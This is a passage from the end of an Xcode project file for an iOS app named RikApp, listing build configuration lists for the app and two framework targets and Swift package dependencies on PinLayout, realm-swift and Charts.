				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		4AE4982A2ED4D24400612F18 /* Build configuration list for PBXProject "RikApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				4AE498452ED4D24500612F18 /* Debug */,
				4AE498462ED4D24500612F18 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		4AE498422ED4D24500612F18 /* Build configuration list for PBXNativeTarget "RikApp" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				4AE498432ED4D24500612F18 /* Debug */,
				4AE498442ED4D24500612F18 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		4AE498842ED4D9E400612F18 /* Build configuration list for PBXNativeTarget "NetworkLayerFramework" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				4AE498852ED4D9E400612F18 /* Debug */,
				4AE498862ED4D9E400612F18 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		4AE49BE82ED5CB1900612F18 /* Build configuration list for PBXNativeTarget "BusinessLogicFramework" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				4AE49BEC2ED5CB1900612F18 /* Debug */,
				4AE49BED2ED5CB1900612F18 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/layoutBox/PinLayout.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 1.10.6;
			};
		};
		4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/realm/realm-swift.git";
			requirement = {
				branch = master;
				kind = branch;
			};
		};
		4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/ChartsOrg/Charts.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.1.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		4AE498622ED4D62600612F18 /* PinLayout */ = {
			isa = XCSwiftPackageProductDependency;
			package = 4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */;
			productName = PinLayout;
		};
		4AE498652ED4D8DF00612F18 /* RealmSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = 4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */;
			productName = RealmSwift;
		};
		4AE498752ED4D9D300612F18 /* DGCharts */ = {
			isa = XCSwiftPackageProductDependency;
			package = 4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */;
			productName = DGCharts;
		};
		4AE49BE32ED5CB1900612F18 /* RealmSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = 4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */;
			productName = RealmSwift;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 4AE498272ED4D24400612F18 /* Project object */;
}
